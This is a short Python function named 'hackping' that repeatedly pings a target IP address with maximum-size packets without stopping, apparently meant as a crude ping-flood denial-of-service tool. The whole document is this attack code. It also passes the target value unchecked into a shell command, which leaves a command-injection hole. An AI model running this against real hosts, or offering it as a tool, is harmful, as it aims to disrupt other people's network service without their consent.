def hackping(targetIP):
	from os import system
	from gc import collect
	system("ping -a -l 65500 -i 255 %s -t"%(targetIP))
	collect()